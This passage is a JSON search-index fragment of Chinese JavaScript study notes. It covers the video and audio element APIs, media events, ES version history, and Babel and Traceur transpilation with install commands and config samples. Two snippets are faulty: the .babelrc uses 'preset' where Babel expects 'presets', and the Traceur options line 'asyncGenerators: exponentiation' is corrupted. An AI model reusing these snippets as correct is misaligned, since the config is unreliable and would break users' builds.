console.log(e);\n});\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#video-api","title":"Video API","text":"<p><code>HTMLVideoElement</code>\u63a5\u53e3\u4ee3\u8868\u4e86<code>&lt;video&gt;</code>\u5143\u7d20\u3002\u8fd9\u4e2a\u63a5\u53e3\u7ee7\u627f\u4e86<code>HTMLMediaElement</code>\u63a5\u53e3\uff0c\u5e76\u4e14\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5c5e\u6027</p> <ul> <li>height\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u89c6\u9891\u64ad\u653e\u533a\u57df\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027<code>height</code>\u3002</li> <li>width\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u89c6\u9891\u64ad\u653e\u533a\u57df\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027<code>width</code>\u3002</li> <li>videoHeight\uff1a\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u89c6\u9891\u6587\u4ef6\u81ea\u8eab\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002</li> <li>videoWidth\uff1a\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u89c6\u9891\u6587\u4ef6\u81ea\u8eab\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002</li> <li>poster\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e00\u4e2a\u56fe\u50cf\u6587\u4ef6\u7684 URL\uff0c\u7528\u6765\u5728\u65e0\u6cd5\u83b7\u53d6\u89c6\u9891\u6587\u4ef6\u65f6\u66ff\u4ee3\u663e\u793a\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027<code>poster</code>\u3002</li> <li>getVideoPlaybackQuality()\uff1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u5f53\u524d\u89c6\u9891\u56de\u8bbf\u7684\u4e00\u4e9b\u6570\u636e\u3002</li> </ul>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#audio-api","title":"Audio API","text":"<p><code>HTMLAudioElement</code>\u63a5\u53e3\u4ee3\u8868\u4e86<code>&lt;audio&gt;</code>\u5143\u7d20\u3002</p> <p>\u8be5\u63a5\u53e3\u7ee7\u627f\u4e86<code>HTMLMediaElement</code>\uff0c\u4f46\u662f\u6ca1\u6709\u5b9a\u4e49\u81ea\u5df1\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a<code>Audio()</code>\u6784\u9020\u51fd\u6570\uff0c\u8fd4\u56de\u7684\u5c31\u662f<code>HTMLAudioElement</code>\u5b9e\u4f8b\u3002</p> <pre><code>var song = new Audio([URLString]);\n</code></pre> <p><code>Audio()</code>\u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684 URL\u3002\u5982\u679c\u7701\u7565\u8fd9\u4e2a\u53c2\u6570\uff0c\u53ef\u4ee5\u7a0d\u540e\u901a\u8fc7<code>src</code>\u5c5e\u6027\u6307\u5b9a\u3002</p> <p>\u751f\u6210<code>HTMLAudioElement</code>\u5b9e\u4f8b\u4ee5\u540e\uff0c\u4e0d\u7528\u63d2\u5165 DOM\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528<code>play()</code>\u65b9\u6cd5\u5728\u80cc\u666f\u64ad\u653e\u3002</p> <pre><code>var a = new Audio();\nif (a.canPlayType('audio/wav')) {\n  a.src = 'soundeffect.wav';\n  a.play();\n}\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_13","title":"\u516c\u5171\u4e8b\u4ef6","text":"<p><code>&lt;video&gt;</code>\u548c<code>&lt;audio&gt;</code>\u5143\u7d20\u6709\u4ee5\u4e0b\u4e8b\u4ef6\u3002</p> <ul> <li>loadstart\uff1a\u5f00\u59cb\u52a0\u8f7d\u5a92\u4f53\u6587\u4ef6\u65f6\u89e6\u53d1\u3002</li> <li>progress\uff1a\u5a92\u4f53\u6587\u4ef6\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u89e6\u53d1\uff0c\u5927\u6982\u662f\u6bcf\u79d2\u89e6\u53d12\u52308\u6b21\u3002</li> <li>loadedmetadata\uff1a\u5a92\u4f53\u6587\u4ef6\u5143\u6570\u636e\u52a0\u8f7d\u6210\u529f\u65f6\u89e6\u53d1\u3002</li> <li>loadeddata\uff1a\u5f53\u524d\u64ad\u653e\u4f4d\u7f6e\u52a0\u8f7d\u6210\u529f\u540e\u89e6\u53d1\u3002</li> <li>canplay\uff1a\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5f00\u59cb\u64ad\u653e\u65f6\u89e6\u53d1\uff0c\u540e\u9762\u53ef\u80fd\u8fd8\u4f1a\u8bf7\u6c42\u6570\u636e\u3002</li> <li>canplaythrough\uff1a\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u4e00\u76f4\u64ad\u653e\u65f6\u89e6\u53d1\uff0c\u540e\u9762\u4e0d\u9700\u8981\u7ee7\u7eed\u8bf7\u6c42\u6570\u636e\u3002</li> <li>suspend\uff1a\u5df2\u7ecf\u7f13\u51b2\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u6682\u65f6\u505c\u6b62\u4e0b\u8f7d\u65f6\u89e6\u53d1\u3002</li> <li>stalled\uff1a\u5c1d\u8bd5\u52a0\u8f7d\u6570\u636e\uff0c\u4f46\u662f\u6ca1\u6709\u6570\u636e\u8fd4\u56de\u65f6\u89e6\u53d1\u3002</li> <li>play\uff1a\u8c03\u7528<code>play()</code>\u65b9\u6cd5\u65f6\u6216\u81ea\u52a8\u64ad\u653e\u542f\u52a8\u65f6\u89e6\u53d1\u3002\u5982\u679c\u5df2\u7ecf\u52a0\u8f7d\u4e86\u8db3\u591f\u7684\u6570\u636e\uff0c\u8fd9\u4e2a\u4e8b\u4ef6\u540e\u9762\u4f1a\u7d27\u8ddf<code>playing</code>\u4e8b\u4ef6\uff0c\u5426\u5219\u4f1a\u89e6\u53d1<code>waiting</code>\u4e8b\u4ef6\u3002</li> <li>waiting\uff1a\u7531\u4e8e\u6ca1\u6709\u8db3\u591f\u7684\u7f13\u5b58\u6570\u636e\uff0c\u65e0\u6cd5\u64ad\u653e\u6216\u64ad\u653e\u505c\u6b62\u65f6\u89e6\u53d1\u3002\u4e00\u65e6\u7f13\u51b2\u6570\u636e\u8db3\u591f\u5f00\u59cb\u64ad\u653e\uff0c\u540e\u9762\u5c31\u4f1a\u7d27\u8ddf<code>playing</code>\u4e8b\u4ef6\u3002</li> <li>playing\uff1a\u5a92\u4f53\u5f00\u59cb\u64ad\u653e\u65f6\u89e6\u53d1\u3002</li> <li>timeupdate\uff1a<code>currentTime</code>\u5c5e\u6027\u53d8\u5316\u65f6\u89e6\u53d1\uff0c\u6bcf\u79d2\u53ef\u80fd\u89e6\u53d14\u523060\u6b21\u3002</li> <li>pause\uff1a\u8c03\u7528<code>pause()</code>\u65b9\u6cd5\u3001\u64ad\u653e\u6682\u505c\u65f6\u89e6\u53d1\u3002</li> <li>seeking\uff1a\u811a\u672c\u6216\u8005\u7528\u6237\u8981\u6c42\u64ad\u653e\u67d0\u4e2a\u6ca1\u6709\u7f13\u51b2\u7684\u4f4d\u7f6e\uff0c\u64ad\u653e\u505c\u6b62\u5f00\u59cb\u52a0\u8f7d\u6570\u636e\u65f6\u89e6\u53d1\u3002\u6b64\u65f6\uff0c<code>seeking</code>\u5c5e\u6027\u8fd4\u56de<code>true</code>\u3002</li> <li>seeked\uff1a<code>seeking</code>\u5c5e\u6027\u53d8\u56de<code>false</code>\u65f6\u89e6\u53d1\u3002</li> <li>ended\uff1a\u5a92\u4f53\u6587\u4ef6\u64ad\u653e\u5b8c\u6bd5\u65f6\u89e6\u53d1\u3002</li> <li>durationchange\uff1a<code>duration</code>\u5c5e\u6027\u53d8\u5316\u65f6\u89e6\u53d1\u3002</li> <li>volumechange\uff1a\u97f3\u91cf\u53d8\u56de\u6216\u8005\u9759\u97f3\u65f6\u89e6\u53d1\u3002</li> <li>ratechange\uff1a\u64ad\u653e\u901f\u5ea6\u6216\u9ed8\u8ba4\u7684\u64ad\u653e\u901f\u5ea6\u53d8\u5316\u65f6\u89e6\u53d1\u3002</li> <li>abort\uff1a\u505c\u6b62\u52a0\u8f7d\u5a92\u4f53\u6587\u4ef6\u65f6\u89e6\u53d1\uff0c\u901a\u5e38\u662f\u7528\u6237\u4e3b\u52a8\u8981\u6c42\u505c\u6b62\u4e0b\u8f7d\u3002</li> <li>error\uff1a\u7f51\u7edc\u6216\u5176\u4ed6\u539f\u56e0\u5bfc\u81f4\u5a92\u4f53\u6587\u4ef6\u65e0\u6cd5\u52a0\u8f7d\u65f6\u89e6\u53d1\u3002</li> <li>emptied\uff1a\u7531\u4e8e<code>error</code>\u6216<code>abort</code>\u4e8b\u4ef6\u5bfc\u81f4<code>networkState</code>\u5c5e\u6027\u53d8\u6210\u65e0\u6cd5\u83b7\u53d6\u6570\u636e\u65f6\u89e6\u53d1\u3002</li> </ul>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/","title":"01-\u4ecb\u7ecd","text":""},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#_1","title":"\u4ecb\u7ecd\u548c\u7f16\u8bd1","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 10876  \u9605\u8bfb22\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#ecma","title":"ECMA \u53d1\u5c55\u4ecb\u7ecd","text":"<p>ES3 \u57281999\u5e74\u51fa\u73b0\uff0c\u662f\u4e00\u4e2a\u57fa\u672c\u8ba4\u53ef\u7684\u6807\u51c6\u3002</p> <p>ES4 \u7248\u672c\u6539\u53d8\u5f88\u5927\uff0c2007\u5e74\u4e0d\u540c\u516c\u53f8\u4e89\u8bae\u5f88\u5927\uff0c\u6240\u4ee5\u6ca1\u6709\u53d1\u884c\uff08\u5f88\u591a\u8bed\u6cd5\u5e76\u5165ES6\u4e2d\uff09\u3002</p> <p>ES5 2009\u5e7412\u6708\u53d1\u5e03\uff0c\u548cES3\u517c\u5bb9\uff0c\u8de8\u8d8a\u4e0d\u662f\u5f88\u5927\u3002</p> <p>ES6 2015\u5e746\u6708\u53d1\u5e03\uff0cECMA2015\u7248\u672c\uff0c\u5168\u79f0\u5e26\u5e74\u4efd\uff0c\u6bcf\u5e74\u76846\u6708\u4efd\u4f1a\u51fa\u65b0\u7684\u63d0\u6848\u3002\u73b0\u5728\u6d4f\u89c8\u5668\u57fa\u672c\u652f\u6301ES6\uff0cNode\u73af\u5883\u4e5f\u652f\u6301ES6\u3002</p> <p>\u8fd9\u672c\u4e66\u4ecb\u7ecd\u7684\u662f\u57fa\u672c\u7684\u65b0\u8bed\u6cd5\u3002</p>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#babel","title":"Babel \u8f6c\u7801","text":"<p>\u8be6\u7ec6 ES6+React+webpack \u53c2\u8003 https://github.com/Michael18811380328/webpack-babel babel \u7248\u672c\u4e0d\u540c\uff0c\u914d\u7f6e\u65b9\u6cd5\u5dee\u522b\u5f88\u5927\uff08\u4f8b\u59826\u548c7\uff0c\u73b0\u5728\u962e\u8001\u5e08\u7684\u914d\u7f6e\u548c\u81ea\u5df1\u4ed3\u5e93\u7684\u914d\u7f6e\u4e0d\u540c\uff0c\u81ea\u5df1\u7684\u4ed3\u5e93\u53ef\u4ee5\u5b9e\u73b0webpack+babel+react+es6 \u6253\u5305\u7f16\u8bd1\uff09</p> <p>\u5b89\u88c5babel \u5b89\u88c5react\u8f6c\u7801</p> <pre><code>npm install --save-dev @babel/core\nnpm install --save-dev @babel/preset-env\nnpm install --save-dev @babel/preset-react\n\nnpm install --save-dev @babel/core @babel/preset-env @babel/preset-react\n</code></pre> <p>\u914d\u7f6e .babelrc</p> <pre><code>{\n  \"preset\": [\n    \"@babel/env\",\n    \"@babel/preset-react\"\n  ],\n  \"plugins\": []\n}\n</code></pre> <p>\u547d\u4ee4\u884c\u8f6c\u7801</p> <p>\uff08npx \u4f7f\u7528\u6559\u7a0b\uff1ahttp://www.ruanyifeng.com/blog/2019/02/npx.html\uff09</p> <pre><code>npm install --save-dev @babel/cli\n\n# \u8f6c\u7801\u7ed3\u679c\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\n$ npx babel example.js\n\n# \u8f6c\u7801\u7ed3\u679c\u5199\u5165\u4e00\u4e2a\u6587\u4ef6\n# --out-file \u6216 -o \u53c2\u6570\u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\n$ npx babel example.js --out-file compiled.js\n$ npx babel example.js -o compiled.js\n\n# \u6574\u4e2a\u76ee\u5f55\u8f6c\u7801 \u901a\u5e38\u7528\u8fd9\u4e2a\u547d\u4ee4\n# --out-dir \u6216 -d \u53c2\u6570\u6307\u5b9a\u8f93\u51fa\u76ee\u5f55\n$ npx babel src --out-dir lib\n$ npx babel src -d lib\n\n# -s \u53c2\u6570\u751f\u6210source map\u6587\u4ef6\n$ npx babel src -d lib -s\n</code></pre>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#babel-node","title":"babel-node","text":"<p><code>@babel/node</code>\u6a21\u5757\u7684<code>babel-node</code>\u547d\u4ee4\uff0c\u63d0\u4f9b\u4e00\u4e2a\u652f\u6301 ES6 \u7684 REPL \u73af\u5883\u3002\u5b83\u652f\u6301 Node \u7684 REPL \u73af\u5883\u7684\u6240\u6709\u529f\u80fd\uff0c\u800c\u4e14\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c ES6 \u4ee3\u7801\u3002</p> <p>\u9996\u5148\uff0c\u5b89\u88c5\u8fd9\u4e2a\u6a21\u5757\u3002</p> <pre><code>$ npm install --save-dev @babel/node\n</code></pre> <p>\u7136\u540e\uff0c\u6267\u884c<code>babel-node</code>\u5c31\u8fdb\u5165 REPL \u73af\u5883\u3002</p> <pre><code>$ npx babel-node\n&gt; (x =&gt; x * 2)(1)\n2\n</code></pre> <p><code>babel-node</code>\u547d\u4ee4\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c ES6 \u811a\u672c\u3002\u5c06\u4e0a\u9762\u7684\u4ee3\u7801\u653e\u5165\u811a\u672c\u6587\u4ef6<code>es6.js</code>\uff0c\u7136\u540e\u76f4\u63a5\u8fd0\u884c\u3002</p> <pre><code># es6.js \u7684\u4ee3\u7801\n# console.log((x =&gt; x * 2)(1));\n$ npx babel-node es6.js\n2\n</code></pre>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#babelregister","title":"@babel/register \u6a21\u5757","text":"<p><code>@babel/register</code>\u6a21\u5757\u6539\u5199<code>require</code>\u547d\u4ee4\uff0c\u4e3a\u5b83\u52a0\u4e0a\u4e00\u4e2a\u94a9\u5b50\u3002\u6b64\u540e\uff0c\u6bcf\u5f53\u4f7f\u7528<code>require</code>\u52a0\u8f7d<code>.js</code>\u3001<code>.jsx</code>\u3001<code>.es</code>\u548c<code>.es6</code>\u540e\u7f00\u540d\u7684\u6587\u4ef6\uff0c\u5c31\u4f1a\u5148\u7528 Babel \u8fdb\u884c\u8f6c\u7801\u3002</p> <pre><code>$ npm install --save-dev @babel/register\n</code></pre> <p>\u4f7f\u7528\u65f6\uff0c\u5fc5\u987b\u9996\u5148\u52a0\u8f7d<code>@babel/register</code>\u3002</p> <pre><code>// index.js\nrequire('@babel/register');\nrequire('./es6.js');\n</code></pre> <p>\u7136\u540e\uff0c\u5c31\u4e0d\u9700\u8981\u624b\u52a8\u5bf9<code>index.js</code>\u8f6c\u7801\u4e86\u3002</p> <pre><code>$ node index.js\n2\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c<code>@babel/register</code>\u53ea\u4f1a\u5bf9<code>require</code>\u547d\u4ee4\u52a0\u8f7d\u7684\u6587\u4ef6\u8f6c\u7801\uff0c\u800c\u4e0d\u4f1a\u5bf9\u5f53\u524d\u6587\u4ef6\u8f6c\u7801\u3002\u53e6\u5916\uff0c\u7531\u4e8e\u5b83\u662f\u5b9e\u65f6\u8f6c\u7801\uff0c\u6240\u4ee5\u53ea\u9002\u5408\u5728\u5f00\u53d1\u73af\u5883\u4f7f\u7528\u3002</p>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#babel-api","title":"babel API","text":"<p>\u5982\u679c\u67d0\u4e9b\u4ee3\u7801\u9700\u8981\u8c03\u7528 Babel \u7684 API \u8fdb\u884c\u8f6c\u7801\uff0c\u5c31\u8981\u4f7f\u7528<code>@babel/core</code>\u6a21\u5757\u3002</p> <pre><code>var babel = require('@babel/core');\n\n// \u5b57\u7b26\u4e32\u8f6c\u7801\nbabel.transform('code();', options);\n// =&gt; { code, map, ast }\n\n// \u6587\u4ef6\u8f6c\u7801\uff08\u5f02\u6b65\uff09\nbabel.transformFile('filename.js', options, function(err, result) {\n  result; // =&gt; { code, map, ast }\n});\n\n// \u6587\u4ef6\u8f6c\u7801\uff08\u540c\u6b65\uff09\nbabel.transformFileSync('filename.js', options);\n// =&gt; { code, map, ast }\n\n// Babel AST\u8f6c\u7801\nbabel.transformFromAst(ast, code, options);\n// =&gt; { code, map, ast }\n</code></pre> <p>\u914d\u7f6e\u5bf9\u8c61<code>options</code>\uff0c\u53ef\u4ee5\u53c2\u770b\u5b98\u65b9\u6587\u6863http://babeljs.io/docs/usage/options/\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>var babel = require('@babel/core');\n\nvar es6Code = 'let x = n =&gt; n + 1';\nvar es5Code = babel.transform(es6Code, { presets: ['@babel/env'] }).code;\n\nconsole.log(es5Code);\n// '\"use strict\";\\n\\nvar x = function x(n) {\\n  return n + 1;\\n};'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>transform</code>\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u9700\u8981\u88ab\u8f6c\u6362\u7684 ES6 \u4ee3\u7801\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8f6c\u6362\u7684\u914d\u7f6e\u5bf9\u8c61\u3002</p>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#babelpolyfill","title":"@babel/polyfill","text":"<p>Babel \u9ed8\u8ba4\u53ea\u8f6c\u6362\u65b0\u7684 JavaScript \u53e5\u6cd5\uff08syntax\uff09\uff0c\u800c\u4e0d\u8f6c\u6362\u65b0\u7684 API\uff0c\u6bd4\u5982<code>Iterator</code>\u3001<code>Generator</code>\u3001<code>Set</code>\u3001<code>Map</code>\u3001<code>Proxy</code>\u3001<code>Reflect</code>\u3001<code>Symbol</code>\u3001<code>Promise</code>\u7b49\u5168\u5c40\u5bf9\u8c61\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5b9a\u4e49\u5728\u5168\u5c40\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\uff08\u6bd4\u5982<code>Object.assign</code>\uff09\u90fd\u4e0d\u4f1a\u8f6c\u7801\u3002</p> <p>\u4e3e\u4f8b\u6765\u8bf4\uff0cES6 \u5728<code>Array</code>\u5bf9\u8c61\u4e0a==\u65b0\u589e\u4e86<code>Array.from</code>\u65b9\u6cd5\u3002Babel \u5c31\u4e0d\u4f1a\u8f6c\u7801\u8fd9\u4e2a\u65b9\u6cd5\u3002\u5982\u679c\u60f3\u8ba9\u8fd9\u4e2a\u65b9\u6cd5\u8fd0\u884c\uff0c\u5fc5\u987b\u4f7f\u7528<code>babel-polyfill</code>\uff0c\u4e3a\u5f53\u524d\u73af\u5883\u63d0\u4f9b\u4e00\u4e2a\u57ab\u7247==\u3002</p> <p>\u5b89\u88c5\u547d\u4ee4\u5982\u4e0b\u3002</p> <pre><code>$ npm install --save-dev @babel/polyfill\n</code></pre> <p>\u7136\u540e\uff0c\u5728\u811a\u672c\u5934\u90e8\uff0c\u52a0\u5165\u5982\u4e0b\u4e00\u884c\u4ee3\u7801\u3002</p> <pre><code>import '@babel/polyfill';\n// \u6216\u8005\nrequire('@babel/polyfill');\n</code></pre> <p>Babel \u9ed8\u8ba4\u4e0d\u8f6c\u7801\u7684 API \u975e\u5e38\u591a\uff0c\u8be6\u7ec6\u6e05\u5355\u53ef\u4ee5\u67e5\u770b<code>babel-plugin-transform-runtime</code>\u6a21\u5757\u7684definitions.js\u6587\u4ef6\u3002</p>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#_2","title":"\u6d4f\u89c8\u5668\u73af\u5883","text":"<p>Babel \u4e5f\u53ef\u4ee5\u7528\u4e8e\u6d4f\u89c8\u5668\u73af\u5883\uff0c\u4f7f\u7528@babel/standalone\u6a21\u5757\u63d0\u4f9b\u7684\u6d4f\u89c8\u5668\u7248\u672c\uff0c\u5c06\u5176\u63d2\u5165\u7f51\u9875\u3002</p> <pre><code>&lt;script src=\"https://unpkg.com/@babel/standalone/babel.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/babel\"&gt;\n// Your ES6 code\n&lt;/script&gt;\n</code></pre> <p>\u6ce8\u610f\uff0c\u7f51\u9875\u5b9e\u65f6\u5c06 ES6 \u4ee3\u7801\u8f6c\u4e3a ES5\uff0c\u5bf9\u6027\u80fd\u4f1a\u6709\u5f71\u54cd\u3002\u751f\u4ea7\u73af\u5883\u9700\u8981\u52a0\u8f7d\u5df2\u7ecf\u8f6c\u7801\u5b8c\u6210\u7684\u811a\u672c\u3002</p>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#_3","title":"\u540e\u9762\u4e86\u89e3\uff08\u5b9e\u9645\u672a\u4f7f\u7528\uff09","text":""},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#traceur","title":"Traceur \u8f6c\u7801\u5668","text":"<p>Google \u516c\u53f8\u7684Traceur\u8f6c\u7801\u5668\uff0c\u4e5f\u53ef\u4ee5\u5c06 ES6 \u4ee3\u7801\u8f6c\u4e3a ES5 \u4ee3\u7801\u3002</p>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#_4","title":"\u76f4\u63a5\u63d2\u5165\u7f51\u9875","text":"<p>Traceur \u5141\u8bb8\u5c06 ES6 \u4ee3\u7801\u76f4\u63a5\u63d2\u5165\u7f51\u9875\u3002\u9996\u5148\uff0c\u5fc5\u987b\u5728\u7f51\u9875\u5934\u90e8\u52a0\u8f7d Traceur \u5e93\u6587\u4ef6\u3002</p> <pre><code>&lt;script src=\"https://google.github.io/traceur-compiler/bin/traceur.js\"&gt;&lt;/script&gt;\n&lt;script src=\"https://google.github.io/traceur-compiler/bin/BrowserSystem.js\"&gt;&lt;/script&gt;\n&lt;script src=\"https://google.github.io/traceur-compiler/src/bootstrap.js\"&gt;&lt;/script&gt;\n&lt;script type=\"module\"&gt;\n  import './Greeter.js';\n&lt;/script&gt;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u5171\u6709 4 \u4e2a<code>script</code>\u6807\u7b7e\u3002\u7b2c\u4e00\u4e2a\u662f\u52a0\u8f7d Traceur \u7684\u5e93\u6587\u4ef6\uff0c\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u662f\u5c06\u8fd9\u4e2a\u5e93\u6587\u4ef6\u7528\u4e8e\u6d4f\u89c8\u5668\u73af\u5883\uff0c\u7b2c\u56db\u4e2a\u5219\u662f\u52a0\u8f7d\u7528\u6237\u811a\u672c\uff0c\u8fd9\u4e2a\u811a\u672c\u91cc\u9762\u53ef\u4ee5\u4f7f\u7528 ES6 \u4ee3\u7801\u3002</p> <p>\u6ce8\u610f\uff0c\u7b2c\u56db\u4e2a<code>script</code>\u6807\u7b7e\u7684<code>type</code>\u5c5e\u6027\u7684\u503c\u662f<code>module</code>\uff0c\u800c\u4e0d\u662f<code>text/javascript</code>\u3002\u8fd9\u662f Traceur \u7f16\u8bd1\u5668\u8bc6\u522b ES6 \u4ee3\u7801\u7684\u6807\u5fd7\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u5c06\u6240\u6709<code>type=module</code>\u7684\u4ee3\u7801\u7f16\u8bd1\u4e3a ES5\uff0c\u7136\u540e\u518d\u4ea4\u7ed9\u6d4f\u89c8\u5668\u6267\u884c\u3002</p> <p>\u9664\u4e86\u5f15\u7528\u5916\u90e8 ES6 \u811a\u672c\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728\u7f51\u9875\u4e2d\u653e\u7f6e ES6 \u4ee3\u7801\u3002</p> <pre><code>&lt;script type=\"module\"&gt;\n  class Calc {\n    constructor() {\n      console.log('Calc constructor');\n    }\n    add(a, b) {\n      return a + b;\n    }\n  }\n\n  var c = new Calc();\n  console.log(c.add(4,5));\n&lt;/script&gt;\n</code></pre> <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4e0a\u9762\u4ee3\u7801\u4f1a\u5728\u63a7\u5236\u53f0\u6253\u5370\u51fa<code>9</code>\u3002</p> <p>\u5982\u679c\u60f3\u5bf9 Traceur \u7684\u884c\u4e3a\u6709\u7cbe\u786e\u63a7\u5236\uff0c\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u53c2\u6570\u914d\u7f6e\u7684\u5199\u6cd5\u3002</p> <pre><code>&lt;script&gt;\n  // Create the System object\n  window.System = new traceur.runtime.BrowserTraceurLoader();\n  // Set some experimental options\n  var metadata = {\n    traceurOptions: {\n      experimental: true,\n      properTailCalls: true,\n      symbols: true,\n      arrayComprehension: true,\n      asyncFunctions: true,\n      asyncGenerators: exponentiation,\n      forOn: true,\n      generatorComprehension: true\n    }\n  };\n  // Load your module\n  System.import('./myModule.js', {metadata: metadata}).catch(function(ex) {\n    console.error('Import failed', ex.stack || ex);\n  });\n&lt;/script&gt;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9996\u5148\u751f\u6210 Traceur \u7684\u5168\u5c40\u5bf9\u8c61<code>window.System</code>\uff0c\u7136\u540e<code>System.import</code>\u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u52a0\u8f7d ES6\u3002\u52a0\u8f7d\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f20\u5165\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61<code>metadata</code>\uff0c\u8be5\u5bf9\u8c61\u7684<code>traceurOptions</code>\u5c5e\u6027\u53ef\u4ee5\u914d\u7f6e\u652f\u6301 ES6 \u529f\u80fd\u3002\u5982\u679c\u8bbe\u4e3a<code>experimental: true</code>\uff0c\u5c31\u8868\u793a\u9664\u4e86 ES6 \u4ee5\u5916\uff0c\u8fd8\u652f\u6301\u4e00\u4e9b\u5b9e\u9a8c\u6027\u7684\u65b0\u529f\u80fd\u3002</p>"},{"location":"ebook-JSES6-RYF/01-%E4%BB%8B%E7%BB%8D/#_5","title":"\u5728\u7ebf\u8f6c\u6362","text":"<p>Traceur \u4e5f\u63d0\u4f9b\u4e00\u4e2a\u5728\u7ebf\u7f16\u8bd1\u5668\uff0c\u53ef\u4ee5\u5728\u7ebf\u5c06 ES6 \u4ee3\u7801\u8f6c\u4e3a ES5 \u4ee3\u7801\u3002\u8f6c\u6362\u540e\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f5c\u4e3a ES5 \u4ee3\u7801\u63d2\u5165\u7f51\u9875\u8fd0\u884c\u3002</p> <p>\u4e0a\u9762\u7684\u4f8b\u5b50\u8f6c\u4e3a ES5 \u4ee3\u7801\u8fd0\u884c\uff0c\u5c31\u662f\u4e0b\u9762\u8fd9\u4e2a\u6837\u5b50\u3002</p> <pre><code>&lt;script src=\"https://google.github.io/traceur-compiler/bin/traceur.js\"&gt;&lt;/script&gt;\n&lt;script src=\"https://google.github.io/traceur-compiler/bin/BrowserSystem.js\"&gt;&lt;/script&gt;\n&lt;script src=\"https://google.github.io/traceur-compiler/src/bootstrap.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\n$traceurRuntime.ModuleStore.getAnonymousModule(function() {\n  \"use strict\";\n\n  var Calc = function Calc() {\n    console.log('Calc constructor');\n  };\n\n  ($traceurRuntime.createClass)(Calc, {add: function(a, b) {\n    return a + b;\n  }}, {});\n\n  var c = new Calc();\n  console.log(c.add(4, 5));\n  return 